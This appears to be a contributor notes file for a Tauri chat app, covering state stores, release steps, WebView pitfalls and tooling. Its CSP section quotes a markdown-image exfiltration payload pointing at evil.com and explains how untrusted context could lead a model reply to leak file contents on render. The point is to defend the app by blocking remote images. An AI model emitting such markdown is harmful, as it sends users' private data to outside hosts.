- **Branch a side chat from another side chat** — a side chat's `parentSideChatId` (`sessionStore.addSideChat(sessionId, model, parentSideChatId)`) marks it branched from another side chat. Created via the `GitBranch` icon in `ChatPane`'s header, or "Ask in side chat" from a selection inside a side chat. The child's context resolves to `getSideChatStore(parentSideChatId)` instead of `useMainChat` (see `SidePanel.jsx`). `buildSideChatTree()` assigns path labels (`1`, `1.1`, ...) and display order in one depth-first pass; `buildTabRows()` renders stacked rows from root to the active tab so only the active branch's children show. `TabButton`'s tooltip reads the live per-tab store (`getSideChatStore(sc.id)`), not the `sessionStore` snapshot, which can lag mid-stream.

## Things to know before you change state stores

- **Don't read `useSettingsStore` at module init.** It returns in-memory defaults before SQLite hydration completes. Subscribe to `hydrated`, or read `useSettingsStore.getState()` inside an action.
- **Store actions, not components, write to SQLite.**
- **Tab switching in the side panel never calls `loadMessages`.** Each tab owns its store permanently via `_sideChatStores`; switching is pure UI state (`activeSideChatId`).
- **`activeChatId` is for navigation, not activity.** Bump `updated_at` only via `bumpSessionActivity(id)` on real user actions.

## Keeping docs in sync

- **Skim `README.md` whenever you touch stack, persistence, or architecture, and fix any drift.** No test catches README drift, so this is a deliberate check. Prone sections: Stack, Persistence/Migrations, Architecture/State stores, project layout tree.
- **`ROADMAP.md` drifts the same way** — after the Electron→Tauri migration it still described the app as Electron throughout (phases, architecture decisions, status table, open-question paths like `electron/tools/search.js`). When you change the stack or move files, grep `ROADMAP.md` for stale references too. Its Status table's per-phase notes (e.g. `maxToolRounds` value, "In progress" markers) also go stale — verify against the code.

## Releasing

- **Version lives in three files, bumped together**: `package.json`, `tauri/tauri.conf.json`, `tauri/Cargo.toml`. `tauri/Cargo.lock`'s `luma` entry gets rewritten by any `cargo` invocation that touches the workspace — verify with `git diff tauri/Cargo.lock` rather than assuming it's stale.
- **After bumping `package.json`, run `npm install` (not a hand-edit)** so `package-lock.json`'s two `version` fields update too.
- **This machine's `~/.npmrc` sets `legacy-peer-deps=true` globally**, which hides lockfile issues that CI's strict `npm ci` will fail on (`EUSAGE`/"Missing: X from lock file"). Reproduce CI before tagging with `rm -rf node_modules && npm ci --no-legacy-peer-deps`; regenerate the lockfile with `npm install --no-legacy-peer-deps` if it fails.
- **Releases are CI-driven**: `.github/workflows/release.yml` builds and publishes a draft release on any `v*` tag push. A `check-main` job gates `release` on the tagged commit being reachable from `origin/main` (`git merge-base --is-ancestor`), so cut tags from `main` (merge `develop` in first).
- **`.github/workflows/ci.yml` is the PR/push gate** (PRs, and pushes to `main`/`develop`): `npm run check`, then `cargo test` minus the three environment-dependent tests, which it skips by name. It needs the Linux webkit stack installed even for `cargo check`, since tauri's build scripts probe for it.
- `CHANGELOG.md` is hand-maintained — update it in the same commit as the version bump, sourced from `git log <prev-tag>..HEAD --oneline`.

## Tauri / WebView pitfalls

- **Don't use `display: none` to hide simultaneously-mounted panes.** In WKWebView, a textarea transitioning `display: none` → `flex` renders but won't accept click-to-focus. Use `visibility: hidden; pointer-events: none` with absolute-position stacking instead (see `SidePanel.module.css`'s `.tabPane`/`.tabPaneActive`).
- **CSS module changes may not hot-reload in the Tauri dev window.** A full restart sometimes picks up what HMR reports as applied but isn't.
- **Unsigned macOS builds are Gatekeeper-blocked on download.** Users must run `xattr -cr /path/to/Luma.app` before opening (worse on arm64). Proper fix needs an Apple Developer account + signing config.
- **The WebView CSP only allows self/data/blob images** (`app.security.csp` in `tauri.conf.json`). A remote image URL in model output is *not* fetched. This is deliberate: markdown rendering is an exfiltration channel (a model reply of `![](https://evil.com/?d=<file contents>)` is fetched automatically on render, and the URL persists in `messages.content`, so it would re-fire on reload or when a folder is detached). The app's only `<img>` tags (`MessageBubble`, `InputArea`) use `data:` URLs and `assetProtocol` isn't enabled, so nothing the UI renders breaks — the cost is remote images in chat markdown. Keep that in mind for anything that puts untrusted content (web pages, file contents) into a context, and add `img-src` sources deliberately if remote images are ever wanted.

## Editor tooling

- **Ignore Prettier-only churn in diffs.** The editor's file-write tool reformats the whole file on save; don't revert those hunks, just focus on the semantic change.
- **Verify UI/CSS tweaks with a throwaway HTML repro, not the repo.** Build a minimal standalone HTML mirroring the global reset + bubble + `markdownBody`, screenshot via Playwright MCP, and write both to `/tmp` — not the repo root, since the screenshot tool defaults there and a stray file lands in the commit (there is **no** pre-commit hook here; `.git/hooks/` holds only samples and `core.hooksPath` is unset, so `git add -A` is what sweeps it up). Check `git show --stat HEAD` after committing to catch stray screenshots.
- **Do a symbol and its call site in one edit (or define it first).** `tauri dev`'s watcher can rebuild between two edit steps and surface a transient `E0425 … not found in this scope` that isn't real — `npm run check` is the honest signal, not the watcher's output.
